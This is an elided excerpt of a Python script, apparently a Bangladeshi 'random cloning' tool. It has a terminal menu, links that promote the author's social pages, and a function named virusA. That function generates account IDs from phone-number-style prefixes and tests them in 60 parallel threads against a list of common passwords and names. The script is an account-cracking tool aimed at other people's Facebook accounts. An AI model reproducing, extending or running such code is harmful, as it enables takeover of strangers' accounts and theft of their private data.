...
os.system('xdg-open https://www.facebook.com/profile.php?id=100000360144702')
...
def Main():
	...
	print(logo)
	print('┌━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┐')
	print(" [\033[1;93mA\33[1;92m] RANDOM CLONING")
	print(" [\033[1;93mB\33[1;92m] FOLLOW MY PAGE ")
	...
	if opt in ["B","2"]:
		admin()
	if opt in ["C","3"]:
		os.system('xdg-open https://www.facebook.com/profile.php?id=61550110377938&mibextid=ZbWKwL');time.sleep(1)
		fb()
	if opt in ["D","4"]:
...
def admin():
	...
	if bal =='1':
		os.system('xdg-open https://wa.me/+8801865544636');time.sleep(1)
		admin()
	if bal =='2':
		os.system('xdg-open https://www.facebook.com/groups/405527491346402/?ref=share');time.sleep(1)
		admin()
	if bal =='3':
		os.system('xdg-open https://github.com/MRX-JIBON-SARKAR');time.sleep(1)
		admin()
	if bal =='0':
		Main()
...
def virusA():
	...
	with ThreadPool(max_workers=60) as yaari:
		...
		print(' [•] \033[1;92mStart Bd Namber Mixt Cracking... ')
		print('└━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┘')
		print(50*'━')
		for guru in user:
			uid = kode+koda+kodb+guru
			pwx = [koda+kodb+guru,kodb+guru,kode+koda+kodb,kode+kode,kode+'123',kode+'1234','Bangladesh','BANGLADESH','freefire','free fire123','FREE FIRE','i love you','nusrat','jannat','sadiya','Farjana','Sultana','102030','100200','12345678','Faruk123','57273200',]
